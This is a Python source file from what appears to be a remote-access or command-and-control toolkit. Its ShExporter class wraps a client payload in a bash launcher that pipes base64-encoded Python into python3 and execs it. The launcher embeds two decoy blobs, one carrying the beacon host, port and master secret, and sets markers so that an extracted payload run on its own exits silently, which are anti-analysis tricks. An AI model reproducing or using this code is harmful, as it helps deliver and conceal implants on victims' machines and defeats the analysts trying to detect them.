"""Bash launcher exporter — heredoc pipes a Python program into python3.

The Python program (inside the heredoc) sets `_RSC_LAUNCHED` and
`_RSC_UUID` before exec'ing the actual blob, so extracting the blob and
running it standalone exits silently. Two decoy blobs are also embedded
and referenced (but never exec'd).
"""

from core.config import Config
from exporter.base_exporter import BaseExporter
from exporter.payload_prep import (
    build_decoy1,
    build_decoy2,
    prepare_payload,
)


class ShExporter(BaseExporter):
    format_name = "sh"
    extension = ".sh"

    def __init__(self, chunk_size=None, beacon_host=None, beacon_port=None):
        kwargs = {}
        if chunk_size is not None:
            kwargs["chunk_size"] = chunk_size
        super().__init__(**kwargs)

        cfg = Config()
        self.beacon_host = beacon_host if beacon_host is not None else cfg.host
        self.beacon_port = beacon_port if beacon_port is not None else cfg.port
        self._master_secret = cfg.auth_secret

    def export(self, client_source: str) -> str:
        uuid, prepared = prepare_payload(client_source)
        actual = self.payload_literal(prepared)
        decoy1 = self.payload_literal(build_decoy1())
        decoy2 = self.payload_literal(
            build_decoy2(self.beacon_host, self.beacon_port, self._master_secret),
        )

        python_body = (
            "import base64\n"
            f"_RSC_UUID = {uuid!r}\n"
            "_RSC_LAUNCHED = True\n"
            "_ACTUAL_B64 = (\n"
            f"{actual}\n"
            ")\n"
            "_DECOY1_B64 = (\n"
            f"{decoy1}\n"
            ")\n"
            "_DECOY2_B64 = (\n"
            f"{decoy2}\n"
            ")\n"
            "try:\n"
            "    _RSC_LOADER = base64.b64decode(_DECOY1_B64)\n"
            "    _RSC_DIAG = base64.b64decode(_DECOY2_B64)\n"
            "except Exception:\n"
            "    pass\n"
            "exec(compile(base64.b64decode(_ACTUAL_B64), '<payload>', 'exec'))\n"
        )

        return (
            "#!/usr/bin/env bash\n"
            "# Auto-generated payload launcher.\n"
            "set -euo pipefail\n\n"
            'PY="$(command -v python3 || command -v python || true)"\n'
            '[ -n "$PY" ] || { echo "python3/python not found" >&2; exit 1; }\n\n'
            '"$PY" - << \'PYEOF\'\n'
            f"{python_body}"
            "PYEOF\n"
        )
